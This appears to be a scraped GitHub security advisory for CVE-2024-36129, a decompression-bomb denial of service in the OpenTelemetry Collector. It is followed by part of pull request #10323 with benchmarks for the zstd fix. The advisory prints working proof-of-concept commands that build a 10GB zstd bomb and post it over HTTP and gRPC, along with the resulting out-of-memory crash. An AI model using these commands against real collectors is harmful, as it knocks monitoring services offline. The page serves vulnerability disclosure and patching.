  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fopen-telemetry%2Fopentelemetry-collector%2Fsecurity%2Fadvisories%2FGHSA-c74f-6mfw-mm4v)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=open-telemetry%2Fopentelemetry-collector)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[open-telemetry](/open-telemetry)
/
**[opentelemetry-collector](/open-telemetry/opentelemetry-collector)**
Public

* [Notifications](/login?return_to=%2Fopen-telemetry%2Fopentelemetry-collector) You must be signed in to change notification settings
* [Fork
  1.5k](/login?return_to=%2Fopen-telemetry%2Fopentelemetry-collector)
* [Star
   4.7k](/login?return_to=%2Fopen-telemetry%2Fopentelemetry-collector)

* [Code](/open-telemetry/opentelemetry-collector)
* [Issues
  577](/open-telemetry/opentelemetry-collector/issues)
* [Pull requests
  62](/open-telemetry/opentelemetry-collector/pulls)
* [Discussions](/open-telemetry/opentelemetry-collector/discussions)
* [Actions](/open-telemetry/opentelemetry-collector/actions)
* [Projects
  1](/open-telemetry/opentelemetry-collector/projects)
* [Security](/open-telemetry/opentelemetry-collector/security)
* [Insights](/open-telemetry/opentelemetry-collector/pulse)

Additional navigation options

* [Code](/open-telemetry/opentelemetry-collector)
* [Issues](/open-telemetry/opentelemetry-collector/issues)
* [Pull requests](/open-telemetry/opentelemetry-collector/pulls)
* [Discussions](/open-telemetry/opentelemetry-collector/discussions)
* [Actions](/open-telemetry/opentelemetry-collector/actions)
* [Projects](/open-telemetry/opentelemetry-collector/projects)
* [Security](/open-telemetry/opentelemetry-collector/security)
* [Insights](/open-telemetry/opentelemetry-collector/pulse)

# Denial of Service via Zip/Decompression Bomb sent over HTTP or gRPC

High

[arminru](/arminru)
published
GHSA-c74f-6mfw-mm4v
Jun 5, 2024

## Package

gomod

go.opentelemetry.io/collector/config/configgrpc
([Go](/advisories?query=ecosystem%3Ago))

## Affected versions

< 0.102.1

## Patched versions

0.102.1

gomod

go.opentelemetry.io/collector/config/confighttp
([Go](/advisories?query=ecosystem%3Ago))

< 0.102.0

0.102.0

## Description

### Summary

An unsafe decompression vulnerability allows unauthenticated attackers to crash the collector via excessive memory consumption.

### Details

The OpenTelemetry Collector handles compressed HTTP requests by recognizing the Content-Encoding header, rewriting the HTTP request body, and allowing subsequent handlers to process decompressed data. It supports the gzip, zstd, zlib, snappy, and deflate compression algorithms. A "zip bomb" or "decompression bomb" is a malicious archive designed to crash or disable the system reading it. Decompression of HTTP requests is typically not enabled by default in popular server solutions due to associated security risks. A malicious attacker could leverage this weakness to crash the collector by sending a small request that, when uncompressed by the server, results in excessive memory consumption.

During proof-of-concept (PoC) testing, all supported compression algorithms could be abused, with zstd causing the most significant impact. Compressing 10GB of all-zero data reduced it to 329KB. Sending an HTTP request with this compressed data instantly consumed all available server memory (the testing server had 32GB), leading to an out-of-memory (OOM) kill of the collector application instance.

The root cause for this issue can be found in the following code path:

**Affected File:**

[https://github.com/open-telemetry/opentelemetry-collector/[...]confighttp/compression.go](https://github.com/open-telemetry/opentelemetry-collector/blob/062d0a7ffcd45831f993d21d1c6fb67d3e74b5e2/config/confighttp/compression.go)

**Affected Code:**

```
// httpContentDecompressor offloads the task of handling compressed HTTP requests
// by identifying the compression format in the "Content-Encoding" header and re-writing
// request body so that the handlers further in the chain can work on decompressed data.
// It supports gzip and deflate/zlib compression.
func httpContentDecompressor(h http.Handler, eh func(w http.ResponseWriter, r *http.Request, errorMsg string, statusCode int), decoders map[string]func(body io.ReadCloser) (io.ReadCloser, error)) http.Handler {
    [...]
    d := &decompressor{
        errHandler: errHandler,
        base:   	h,
        decoders: map[string]func(body io.ReadCloser) (io.ReadCloser, error){
            "": func(io.ReadCloser) (io.ReadCloser, error) {
                // Not a compressed payload. Nothing to do.
                return nil, nil
            },
            [...]
            "zstd": func(body io.ReadCloser) (io.ReadCloser, error) {
                zr, err := zstd.NewReader(
                    body,
                    zstd.WithDecoderConcurrency(1),
                )
                if err != nil {
                    return nil, err
                }
                return zr.IOReadCloser(), nil
            },
    [...]
}

func (d *decompressor) ServeHTTP(w http.ResponseWriter, r *http.Request) {
    newBody, err := d.newBodyReader(r)
    if err != nil {
        d.errHandler(w, r, err.Error(), http.StatusBadRequest)
        return
    }
    [...]
    d.base.ServeHTTP(w, r)
}

func (d *decompressor) newBodyReader(r *http.Request) (io.ReadCloser, error) {
    encoding := r.Header.Get(headerContentEncoding)
    decoder, ok := d.decoders[encoding]
    if !ok {
        return nil, fmt.Errorf("unsupported %s: %s", headerContentEncoding, encoding)
    }
    return decoder(r.Body)
}

```

To mitigate this attack vector, it is recommended to either disable support for decompressing client HTTP requests entirely or limit the size of the decompressed data that can be processed. Limiting the decompressed data size can be achieved by wrapping the decompressed data reader inside an io.LimitedReader, which restricts the reading to a specified number of bytes. This approach helps prevent excessive memory usage and potential out-of-memory errors caused by decompression bombs.

### PoC

This issue was confirmed as follows:

**PoC Commands:**

```
dd if=/dev/zero bs=1G count=10 | zstd > poc.zst
curl -vv "http://192.168.0.107:4318/v1/traces" -H "Content-Type: application/x-protobuf" -H "Content-Encoding: zstd" --data-binary @poc.zst

```

**Output:**

```
10+0 records in
10+0 records out
10737418240 bytes (11 GB, 10 GiB) copied, 12,207 s, 880 MB/s

* processing: http://192.168.0.107:4318/v1/traces
*   Trying 192.168.0.107:4318...
* Connected to 192.168.0.107 (192.168.0.107) port 4318
> POST /v1/traces HTTP/1.1
> Host: 192.168.0.107:4318
> User-Agent: curl/8.2.1
> Accept: */*
> Content-Type: application/x-protobuf
> Content-Encoding: zstd
> Content-Length: 336655
>
* We are completely uploaded and fine
* Recv failure: Connection reset by peer
* Closing connection
curl: (56) Recv failure: Connection reset by peer

```

**Server logs:**

```
otel-collector-1  | 2024-05-30T18:36:14.376Z    info    service@v0.101.0/service.go:102    Setting up own telemetry...
[...]
otel-collector-1  | 2024-05-30T18:36:14.385Z    info    otlpreceiver@v0.101.0/otlp.go:152    Starting HTTP server    {"kind": "receiver", "name": "otlp", "data_type": "traces", "endpoint": "0.0.0.0:4318"}
otel-collector-1  | 2024-05-30T18:36:14.385Z    info    service@v0.101.0/service.go:195    Everything is ready. Begin running and processing data.
otel-collector-1  | 2024-05-30T18:36:14.385Z    warn    localhostgate/featuregate.go:63    The default endpoints for all servers in components will change to use localhost instead of 0.0.0.0 in a future version. Use the feature gate to preview the new default.    {"feature gate ID": "component.UseLocalHostAsDefaultHost"}
otel-collector-1 exited with code 137

```

A similar problem exists for configgrpc when using the zstd compression:

```
dd if=/dev/zero bs=1G count=10 | zstd > poc.zst
python3 -c 'import os, struct; f = open("/tmp/body.raw", "w+b"); f.write(b"\x01"); f.write(struct.pack(">L", os.path.getsize("poc.zst"))); f.write(open("poc.zst", "rb").read())'
curl -vv http://127.0.0.1:4317/opentelemetry.proto.collector.trace.v1.TraceService/Export --http2-prior-knowledge -H "content-type: application/grpc" -H "grpc-encoding: zstd" --data-binary @/tmp/body.raw

```
### Impact

Unauthenticated attackers can crash the collector via excessive memory consumption, stopping the entire collection of telemetry.

### Patches

* The confighttp module version 0.102.0 contains a fix for this problem.
* The configgrpc module version 0.102.1 contains a fix for this problem.
* All official OTel Collector distributions starting with v0.102.1 contain both fixes.

### Workarounds

* None.

### References

* [#10289](https://github.com/open-telemetry/opentelemetry-collector/pull/10289)
* [#10323](https://github.com/open-telemetry/opentelemetry-collector/pull/10323)
* <https://opentelemetry.io/blog/2024/cve-2024-36129/>

### Credits

This issue was uncovered during a security audit performed by 7ASecurity, facilitated by OSTIF, for the OpenTelemetry project.

### Severity

High

8.2

# CVSS overall score

 This score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS).

 / 10

#### CVSS v3 base metrics

Attack vector
Network

Attack complexity
Low

Privileges required
None

User interaction
None

Scope
Unchanged

Confidentiality
None

Integrity
Low

Availability
High

Learn more about base metrics

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H

### CVE ID

CVE-2024-36129

### Weaknesses

[CWE-119](/advisories?query=cwe%3A119)

### Credits

* [![@jpkrohling](https://avatars.githubusercontent.com/u/13387?s=40&v=4)](/jpkrohling)
  [jpkrohling](/jpkrohling)
  Remediation developer
* [![@arminru](https://avatars.githubusercontent.com/u/7052238?s=40&v=4)](/arminru)
  [arminru](/arminru)
  Coordinator
* [![@mx-psi](https://avatars.githubusercontent.com/u/5502710?s=40&v=4)](/mx-psi)
  [mx-psi](/mx-psi)
  Remediation reviewer
* [![@stamparm](https://avatars.githubusercontent.com/u/921555?s=40&v=4)](/stamparm)
  [stamparm](/stamparm)
  Reporter

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_0e81190c_20250111_025524.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fopen-telemetry%2Fopentelemetry-collector%2Fpull%2F10323)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fopen-telemetry%2Fopentelemetry-collector%2Fpull%2F10323)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fpull_requests_fragments%2Fpull_request_layout&source=header-repo&source_repo=open-telemetry%2Fopentelemetry-collector)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[open-telemetry](/open-telemetry)
/
**[opentelemetry-collector](/open-telemetry/opentelemetry-collector)**
Public

* [Notifications](/login?return_to=%2Fopen-telemetry%2Fopentelemetry-collector) You must be signed in to change notification settings
* [Fork
  1.5k](/login?return_to=%2Fopen-telemetry%2Fopentelemetry-collector)
* [Star
   4.7k](/login?return_to=%2Fopen-telemetry%2Fopentelemetry-collector)

* [Code](/open-telemetry/opentelemetry-collector)
* [Issues
  577](/open-telemetry/opentelemetry-collector/issues)
* [Pull requests
  62](/open-telemetry/opentelemetry-collector/pulls)
* [Discussions](/open-telemetry/opentelemetry-collector/discussions)
* [Actions](/open-telemetry/opentelemetry-collector/actions)
* [Projects
  1](/open-telemetry/opentelemetry-collector/projects)
* [Security](/open-telemetry/opentelemetry-collector/security)
* [Insights](/open-telemetry/opentelemetry-collector/pulse)

Additional navigation options

* [Code](/open-telemetry/opentelemetry-collector)
* [Issues](/open-telemetry/opentelemetry-collector/issues)
* [Pull requests](/open-telemetry/opentelemetry-collector/pulls)
* [Discussions](/open-telemetry/opentelemetry-collector/discussions)
* [Actions](/open-telemetry/opentelemetry-collector/actions)
* [Projects](/open-telemetry/opentelemetry-collector/projects)
* [Security](/open-telemetry/opentelemetry-collector/security)
* [Insights](/open-telemetry/opentelemetry-collector/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Fopen-telemetry%2Fopentelemetry-collector%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Fopen-telemetry%2Fopentelemetry-collector%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# [configgrpc] Use own compressors for zstd #10323

 Merged

[mx-psi](/mx-psi)
merged 3 commits into
[open-telemetry:main](/open-telemetry/opentelemetry-collector/tree/main "open-telemetry/opentelemetry-collector:main")
from
[jpkrohling:jpkrohling/apply-size-restriction-to-decompressed-grpc](/jpkrohling/opentelemetry-collector/tree/jpkrohling/apply-size-restriction-to-decompressed-grpc "jpkrohling/opentelemetry-collector:jpkrohling/apply-size-restriction-to-decompressed-grpc")

Jun 5, 2024

 Merged

# [[configgrpc] Use own compressors for zstd](#top) #10323

[mx-psi](/mx-psi)
merged 3 commits into
[open-telemetry:main](/open-telemetry/opentelemetry-collector/tree/main "open-telemetry/opentelemetry-collector:main")
from
[jpkrohling:jpkrohling/apply-size-restriction-to-decompressed-grpc](/jpkrohling/opentelemetry-collector/tree/jpkrohling/apply-size-restriction-to-decompressed-grpc "jpkrohling/opentelemetry-collector:jpkrohling/apply-size-restriction-to-decompressed-grpc")

Jun 5, 2024

[Conversation
2](/open-telemetry/opentelemetry-collector/pull/10323)
[Commits
3](/open-telemetry/opentelemetry-collector/pull/10323/commits)
[Checks
49](/open-telemetry/opentelemetry-collector/pull/10323/checks)
[Files changed](/open-telemetry/opentelemetry-collector/pull/10323/files)

## Conversation

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

[![jpkrohling](https://avatars.githubusercontent.com/u/13387?s=60&v=4)](/jpkrohling)

Copy link

Member

### @jpkrohling **[jpkrohling](/jpkrohling)** commented [Jun 5, 2024](#issue-2335713234)

Uses our own version of the zstd compressor for gRPC servers. The code for it is based on the gzip compressor that comes built-in with gRPC.

Benchmarks before this PR:

```
Running tool: /usr/bin/go test -benchmem -run=^$ -bench ^BenchmarkCompressors$ go.opentelemetry.io/collector/config/configgrpc

sm_log_requestgoos: linux
goarch: amd64
pkg: go.opentelemetry.io/collector/config/configgrpc
cpu: 11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz
BenchmarkCompressors/sm_log_request/raw_bytes_160/compressed_bytes_162/compressor_gzip-16         	   71594	     19066 ns/op	     615 B/op	       4 allocs/op
sm_log_requestBenchmarkCompressors/sm_log_request/raw_bytes_160/compressed_bytes_159/compressor_zstd-16         	  151503	      8544 ns/op	     640 B/op	       6 allocs/op
sm_log_requestBenchmarkCompressors/sm_log_request/raw_bytes_160/compressed_bytes_178/compressor_snappy-16       	 3632570	       303.8 ns/op	     304 B/op	       3 allocs/op
md_log_requestBenchmarkCompressors/md_log_request/raw_bytes_242/compressed_bytes_219/compressor_gzip-16         	   68114	     16938 ns/op	     748 B/op	       4 allocs/op
md_log_requestBenchmarkCompressors/md_log_request/raw_bytes_242/compressed_bytes_209/compressor_zstd-16         	  138091	      8047 ns/op	     896 B/op	       6 allocs/op
md_log_requestBenchmarkCompressors/md_log_request/raw_bytes_242/compressed_bytes_260/compressor_snappy-16       	 3081198	       402.5 ns/op	     400 B/op	       3 allocs/op
lg_log_requestBenchmarkCompressors/lg_log_request/raw_bytes_4850/compressed_bytes_253/compressor_gzip-16        	   43414	     27174 ns/op	     386 B/op	       3 allocs/op
lg_log_requestBenchmarkCompressors/lg_log_request/raw_bytes_4850/compressed_bytes_216/compressor_zstd-16        	  117534	      9903 ns/op	   10112 B/op	       6 allocs/op
lg_log_requestBenchmarkCompressors/lg_log_request/raw_bytes_4850/compressed_bytes_454/compressor_snappy-16      	 1000000	      1190 ns/op	     528 B/op	       2 allocs/op
sm_trace_requestBenchmarkCompressors/sm_trace_request/raw_bytes_231/compressed_bytes_203/compressor_gzip-16       	   67275	     17508 ns/op	     700 B/op	       4 allocs/op
sm_trace_requestBenchmarkCompressors/sm_trace_request/raw_bytes_231/compressed_bytes_201/compressor_zstd-16       	  196862	      6137 ns/op	     848 B/op	       6 allocs/op
sm_trace_requestBenchmarkCompressors/sm_trace_request/raw_bytes_231/compressed_bytes_220/compressor_snappy-16     	 3595815	       331.7 ns/op	     272 B/op	       2 allocs/op
md_trace_requestBenchmarkCompressors/md_trace_request/raw_bytes_329/compressed_bytes_249/compressor_gzip-16       	   64105	     19104 ns/op	     844 B/op	       4 allocs/op
md_trace_requestBenchmarkCompressors/md_trace_request/raw_bytes_329/compressed_bytes_256/compressor_zstd-16       	  169221	      6929 ns/op	    1120 B/op	       6 allocs/op
md_trace_requestBenchmarkCompressors/md_trace_request/raw_bytes_329/compressed_bytes_279/compressor_snappy-16     	 2602239	       473.0 ns/op	     336 B/op	       2 allocs/op
lg_trace_requestBenchmarkCompressors/lg_trace_request/raw_bytes_7025/compressed_bytes_303/compressor_gzip-16      	   33861	     36473 ns/op	     904 B/op	       4 allocs/op
lg_trace_requestBenchmarkCompressors/lg_trace_request/raw_bytes_7025/compressed_bytes_258/compressor_zstd-16      	  107828	     10596 ns/op	   16832 B/op	       6 allocs/op
lg_trace_requestBenchmarkCompressors/lg_trace_request/raw_bytes_7025/compressed_bytes_591/compressor_snappy-16    	  725080	      1540 ns/op	     689 B/op	       2 allocs/op
sm_metric_requestBenchmarkCompressors/sm_metric_request/raw_bytes_183/compressed_bytes_140/compressor_gzip-16      	   76315	     16394 ns/op	     496 B/op	       4 allocs/op
sm_metric_requestBenchmarkCompressors/sm_metric_request/raw_bytes_183/compressed_bytes_137/compressor_zstd-16      	  193314	      5957 ns/op	     688 B/op	       6 allocs/op
sm_metric_requestBenchmarkCompressors/sm_metric_request/raw_bytes_183/compressed_bytes_152/compressor_snappy-16    	 3558649	       345.2 ns/op	     208 B/op	       2 allocs/op
md_metric_requestBenchmarkCompressors/md_metric_request/raw_bytes_376/compressed_bytes_194/compressor_gzip-16      	   68497	     18413 ns/op	     699 B/op	       4 allocs/op
md_metric_requestBenchmarkCompressors/md_metric_request/raw_bytes_376/compressed_bytes_198/compressor_zstd-16      	  177841	      6520 ns/op	    1136 B/op	       6 allocs/op
md_metric_requestBenchmarkCompressors/md_metric_request/raw_bytes_376/compressed_bytes_222/compressor_snappy-16    	 2354102	       497.4 ns/op	     272 B/op	       2 allocs/op
lg_metric_requestBenchmarkCompressors/lg_metric_request/raw_bytes_10991/compressed_bytes_601/compressor_gzip-16    	   21943	     54603 ns/op	    1941 B/op	       5 allocs/op
lg_metric_requestBenchmarkCompressors/lg_metric_request/raw_bytes_10991/compressed_bytes_559/compressor_zstd-16    	   71260	     16077 ns/op	   25312 B/op	       6 allocs/op
lg_metric_requestBenchmarkCompressors/lg_metric_request/raw_bytes_10991/compressed_bytes_1055/compressor_snappy-16 	  335415	      3026 ns/op	    1200 B/op	       2 allocs/op
PASS
ok  	go.opentelemetry.io/collector/config/configgrpc	37.766s

```

After this version:

```
Running tool: /usr/bin/go test -benchmem -run=^$ -bench ^BenchmarkCompressors$ go.opentelemetry.io/collector/config/configgrpc

sm_log_requestgoos: linux
goarch: amd64
pkg: go.opentelemetry.io/collector/config/configgrpc
cpu: 11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz
BenchmarkCompressors/sm_log_request/raw_bytes_160/compressed_bytes_162/compressor_gzip-16         	   74952	     15710 ns/op	     603 B/op	       4 allocs/op
sm_log_requestBenchmarkCompressors/sm_log_request/raw_bytes_160/compressed_bytes_159/compressor_zstd-16         	  156784	      6966 ns/op	     208 B/op	       2 allocs/op
sm_log_requestBenchmarkCompressors/sm_log_request/raw_bytes_160/compressed_bytes_178/compressor_snappy-16       	 2216174	       510.4 ns/op	     308 B/op	       3 allocs/op
md_log_requestBenchmarkCompressors/md_log_request/raw_bytes_242/compressed_bytes_219/compressor_gzip-16         	   68095	     18569 ns/op	     736 B/op	       4 allocs/op
md_log_requestBenchmarkCompressors/md_log_request/raw_bytes_242/compressed_bytes_209/compressor_zstd-16         	  150705	      8849 ns/op	     294 B/op	       2 allocs/op
md_log_requestBenchmarkCompressors/md_log_request/raw_bytes_242/compressed_bytes_260/compressor_snappy-16       	 2149710	       556.8 ns/op	     406 B/op	       3 allocs/op
lg_log_requestBenchmarkCompressors/lg_log_request/raw_bytes_4850/compressed_bytes_253/compressor_gzip-16        	   40040	     26159 ns/op	     368 B/op	       3 allocs/op
lg_log_requestBenchmarkCompressors/lg_log_request/raw_bytes_4850/compressed_bytes_216/compressor_zstd-16        	  123043	     10254 ns/op	     299 B/op	       2 allocs/op
lg_log_requestBenchmarkCompressors/lg_log_request/raw_bytes_4850/compressed_bytes_454/compressor_snappy-16      	  726780	      1457 ns/op	     533 B/op	       2 allocs/op
sm_trace_requestBenchmarkCompressors/sm_trace_request/raw_bytes_231/compressed_bytes_203/compressor_gzip-16       	   64660	     18186 ns/op	     701 B/op	       4 allocs/op
sm_trace_requestBenchmarkCompressors/sm_trace_request/raw_bytes_231/compressed_bytes_201/compressor_zstd-16       	  193225	      6267 ns/op	     273 B/op	       2 allocs/op
sm_trace_requestBenchmarkCompressors/sm_trace_request/raw_bytes_231/compressed_bytes_220/compressor_snappy-16     	 2925073	       418.2 ns/op	     276 B/op	       2 allocs/op
md_trace_requestBenchmarkCompressors/md_trace_request/raw_bytes_329/compressed_bytes_249/compressor_gzip-16       	   61320	     20641 ns/op	     846 B/op	       4 allocs/op
md_trace_requestBenchmarkCompressors/md_trace_request/raw_bytes_329/compressed_bytes_256/compressor_zstd-16       	  190965	      6440 ns/op	     321 B/op	       2 allocs/op
md_trace_requestBenchmarkCompressors/md_trace_request/raw_bytes_329/compressed_bytes_279/compressor_snappy-16     	 2051575	       656.8 ns/op	     341 B/op	       2 allocs/op
lg_trace_requestBenchmarkCompressors/lg_trace_request/raw_bytes_7025/compressed_bytes_303/compressor_gzip-16      	   30097	     40680 ns/op	     907 B/op	       4 allocs/op
lg_trace_requestBenchmarkCompressors/lg_trace_request/raw_bytes_7025/compressed_bytes_258/compressor_zstd-16      	  127027	      8437 ns/op	     363 B/op	       2 allocs/op
lg_trace_requestBenchmarkCompressors/lg_trace_request/raw_bytes_7025/compressed_bytes_591/compressor_snappy-16    	  716541	      1803 ns/op	     694 B/op	       2 allocs/op
sm_metric_requestBenchmarkCompressors/sm_metric_request/raw_bytes_183/compressed_bytes_140/compressor_gzip-16      	   82287	     15054 ns/op	     496 B/op	       4 allocs/op
sm_metric_requestBenchmarkCompressors/sm_metric_request/raw_bytes_183/compressed_bytes_137/compressor_zstd-16      	  230558	      5470 ns/op	     221 B/op	       2 allocs/op
sm_metric_requestBenchmarkCompressors/sm_metric_request/raw_bytes_183/compressed_bytes_152/compressor_snappy-16    	 2759403	       417.1 ns/op	     211 B/op	       2 allocs/op
md_metric_requestBenchmarkCompressors/md_metric_request/raw_bytes_376/compressed_bytes_194/compressor_gzip-16      	   58208	     18925 ns/op	     702 B/op	       4 allocs/op
md_metric_requestBenchmarkCompressors/md_metric_request/raw_bytes_376/compressed_bytes_198/compressor_zstd-16      	  199226	      6247 ns/op	     256 B/op	       2 allocs/op
md_metric_requestBenchmarkCompressors/md_metric_request/raw_bytes_376/compressed_bytes_222/compressor_snappy-16    	 2065202	       609.8 ns/op	     276 B/op	       2 allocs/op
lg_metric_requestBenchmarkCompressors/lg_metric_request/raw_bytes_10991/compressed_bytes_601/compressor_gzip-16    	   20583	     59762 ns/op	    1945 B/op	       5 allocs/op
lg_metric_requestBenchmarkCompressors/lg_metric_request/raw_bytes_10991/compressed_bytes_559/compressor_zstd-16    	   98254	     13152 ns/op	     728 B/op	       2 allocs/op
lg_metric_requestBenchmarkCompressors/lg_metric_request/raw_bytes_10991/compressed_bytes_1055/compressor_snappy-16 	  389401	      3976 ns/op	    1209 B/op	       2 allocs/op
PASS
ok  	go.opentelemetry.io/collector/config/configgrpc	40.394s

```

Signed-off-by: Juraci Paixão Kröhling juraci@kroehling.de

Sorry, something went wrong.

All reactions

[![@jpkrohling](https://avatars.githubusercontent.com/u/13387?s=40&v=4)](/jpkrohling)

`[[configgrpc] Use own compressors for zstd](/open-telemetry/opentelemetry-collector/pull/10323/commits/cc9fcb1a53e39d461cbbe129defa4473fc82f463 "[configgrpc] Use own compressors for zstd

Signed-off-by: Juraci Paixão Kröhling <juraci@kroehling.de>")`
 …

